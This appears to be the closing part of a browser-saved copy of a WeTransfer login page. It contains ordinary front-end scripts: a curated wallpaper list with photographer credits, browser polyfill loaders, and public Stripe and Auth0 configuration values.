    var __curated_wallpapers__ = [{"image_path":"curated/wallpaper/one-full.jpg","thumbnail_large":"curated/wallpaper/one_thumbnail_large.jpg","credits":"Bernardo Henning","curated":true},{"image_path":"curated/wallpaper/two-full.jpg","thumbnail_large":"curated/wallpaper/two_thumbnail_large.jpg","credits":"Bernardo Henning","curated":true},{"image_path":"curated/wallpaper/three-full.jpg","thumbnail_large":"curated/wallpaper/three_thumbnail_large.jpg","credits":"Ana Cuba","curated":true},{"image_path":"curated/wallpaper/four-full.jpg","thumbnail_large":"curated/wallpaper/four_thumbnail_large.jpg","credits":"Ana Cuba","curated":true},{"image_path":"curated/wallpaper/five-full.jpg","thumbnail_large":"curated/wallpaper/five_thumbnail_large.jpg","credits":"Hiroyuki Izutsu","curated":true},{"image_path":"curated/wallpaper/six-full.jpg","thumbnail_large":"curated/wallpaper/six_thumbnail_large.jpg","credits":"Hiroyuki Izutsu","curated":true}];
  </script>

  
 <script type="text/javascript" src="https://prod-cdn.wetransfer.net/assets/advertising-4aee5180207621f94abeb04df0d9e7e52f4496bf16a55f712b2feb788c8f89f4.js"></script>

<!-- polyfill `nomodule` in Safari 10.1: -->
<script type="module">
  !function(e,t,n){!("noModule"in(t=e.createElement("script")))&&"onbeforeload"in t&&(n=!1,e.addEventListener("beforeload",function(e){if(e.target===t)n=!0;else if(!e.target.hasAttribute("nomodule")||!n)return;e.preventDefault()},!0),t.type="module",t.src=".",e.head.appendChild(t),t.remove())}(document)
</script>

<script type="text/javascript">
  // remove no-js class when this is executed
  document.documentElement.className = document.documentElement.className.replace(/\s*no-js\s*/, " ");
</script>

<script type="text/javascript">
  window.asset_host = "https://prod-cdn.wetransfer.net";
</script>

<script type="text/javascript">
  var modernBrowser = (
    'Promise' in window &&
    'Symbol' in window &&
    'URLSearchParams' in window &&
    'entries' in Object && 
    'requestAnimationFrame' in window && 
    !!Array.prototype.find &&
    !!NodeList.prototype.forEach
  );

  if (!modernBrowser) {
    var polyfillScript = document.createElement('script');
    polyfillScript.src = "https://prod-cdn.wetransfer.net/packs/js/polyfills.js";
    document.body.appendChild(polyfillScript);
  }
  
  [].map.call(document.querySelectorAll('#preload-assets'),function(l,s){
    s=document.createElement('script');
    s.src = 'noModule' in s ? l.href : l.getAttribute('fallback');
    l.parentNode.appendChild(s);
  })
</script><script src="./Log%20in%20_%20WeTransfer_files/polyfills.js"></script>
  <script type="text/javascript">
  var __stripe__ = { publishable_key: 'pk_live_Mr2LqPswsFjzCjBTJCmOXB0S', api_version: '2020-03-02' };
</script>

  <script type="text/javascript">
  var __walter_api__ = {
    url: ""
  };
</script>

  <script type="text/javascript">
  var __auth0_config__ = {
    domain: "auth.wetransfer.com",
    audience: "aud://transfer-api-prod.wetransfer/",
    client_id: "dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc"
  };
</script>



</body></html>